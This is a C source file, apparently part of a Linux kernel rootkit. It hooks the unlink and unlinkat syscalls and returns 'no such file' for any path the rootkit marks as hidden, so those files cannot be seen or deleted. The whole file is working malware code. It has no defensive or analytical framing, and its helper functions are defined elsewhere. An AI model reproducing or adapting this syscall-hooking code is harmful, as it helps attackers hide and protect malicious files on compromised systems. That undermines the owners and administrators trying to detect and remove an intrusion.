#include "../inc/hooks.h"
#include "../inc/util.h"

#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>

void *_unlink   = NULL;
void *_unlinkat = NULL;

asmlinkage int64_t h_unlink(const struct pt_regs *r) {
  const char __user *pn = (void *)r->di;
  struct path        pn_path;
  int64_t            ret = 0;

  hfind(_unlink, "__x64_sys_unlink");

  if (user_path_at(AT_FDCWD, pn, LOOKUP_FOLLOW, &pn_path) != 0)
    goto end;

  if (should_hide_path(&pn_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_unlink);

  return ret;
}

asmlinkage int64_t h_unlinkat(const struct pt_regs *r) {
  const char __user *pn  = (void *)r->si;
  int32_t            dfd = r->di;
  struct path        pn_path;
  int64_t            ret = 0;

  hfind(_unlinkat, "__x64_sys_unlinkat");

  if (user_path_at(dfd, pn, LOOKUP_FOLLOW, &pn_path) != 0)
    goto end;

  if (should_hide_path(&pn_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_unlinkat);

  return ret;
}
